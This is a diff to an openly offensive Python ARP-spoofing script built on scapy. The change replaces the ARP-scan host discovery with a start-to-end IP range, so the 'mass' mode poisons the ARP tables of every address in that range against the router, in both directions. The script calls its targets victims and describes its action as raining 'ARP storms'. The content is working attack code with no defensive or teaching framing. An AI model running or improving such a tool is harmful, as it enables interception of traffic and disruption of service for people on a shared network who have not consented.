@@ -37,17 +37,6 @@ def get_local_ip():
         logging.error("Failed to snatch the local IP address")
         sys.exit(1)
 
-def get_active_hosts(interface):
-    logging.info("Scanning the network for active targets...")
-    try:
-        ans, _ = scapy.arping(interface, timeout=1, verbose=False)
-        active_hosts = [response[1].psrc for response in ans]
-        logging.info("Snatched some active targets: %s", active_hosts)
-        return active_hosts
-    except Exception as e:
-        logging.error("Failed to locate active targets: %s", e)
-        return []
-
 def get_mac(ip):
     try:
         arp_request = scapy.ARP(pdst=ip)
@@ -117,11 +106,13 @@ def main(args):
         logging.info("Preparing to rain ARP storms...")
         
         if mass:
-            active_hosts = get_active_hosts(interface)
-            for host in active_hosts:
-                if host != router_ip:
-                    arp_spoof(host, router_ip)
-                    arp_spoof(router_ip, host)
+            start_ip = args.start_ip
+            end_ip = args.end_ip
+            for ip in range(int(start_ip.split('.')[-1]), int(end_ip.split('.')[-1]) + 1):
+                target_ip = start_ip.rsplit('.', 1)[0] + '.' + str(ip)
+                if target_ip != router_ip:
+                    arp_spoof(target_ip, router_ip)
+                    arp_spoof(router_ip, target_ip)
         else:
             victim_ip = args.victim_ip
             if not validate_ip(victim_ip):
@@ -137,10 +128,11 @@ def main(args):
         logging.info("Detected Ctrl+C, resetting the battlefield...")
         
         if mass:
-            for host in active_hosts:
-                if host != router_ip:
-                    restore_arp_tables(host, router_ip)
-                    restore_arp_tables(router_ip, host)
+            for ip in range(int(start_ip.split('.')[-1]), int(end_ip.split('.')[-1]) + 1):
+                target_ip = start_ip.rsplit('.', 1)[0] + '.' + str(ip)
+                if target_ip != router_ip:
+                    restore_arp_tables(target_ip, router_ip)
+                    restore_arp_tables(router_ip, target_ip)
         else:
             victim_ip = args.victim_ip
             restore_arp_tables(victim_ip, router_ip)
@@ -155,6 +147,8 @@ if __name__ == "__main__":
     parser.add_argument("-i", "--interface", help="Interface for reconnaissance (default: system's local IP)")
     parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode for more chaos")
     parser.add_argument("-m", "--mass", action="store_true", help="Spoof all IPs connected to the router")
+    parser.add_argument("-s", "--start-ip", help="Starting IP address for mass spoofing")
+    parser.add_argument("-e", "--end-ip", help="Ending IP address for mass spoofing")
     parser.add_argument("-t", "--victim-ip", help="IP address of the victim (required if not mass spoofing)")
     args = parser.parse_args()
     print(doggy)
